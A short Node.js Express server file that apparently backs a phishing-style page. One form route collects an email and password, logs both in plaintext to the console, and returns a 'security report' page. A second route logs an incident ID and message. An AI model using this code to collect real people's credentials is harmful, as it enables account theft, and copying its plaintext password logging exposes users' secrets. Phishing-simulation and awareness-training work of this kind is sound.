require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse URL-encoded data from the form
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to handle form submission
app.post('/send-email', async (req, res) => {
    const { email, password } = req.body;
    console.log(email, password);
    return res.sendFile(path.join(__dirname, 'public/security_report.html'));
});

app.post('/submit-report', async (req, res)=>{
    const {incident_id, message} = req.body;
    console.log(incident_id, message);
    return res.sendFile(path.join(__dirname, 'public/reciept.html'));
})

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
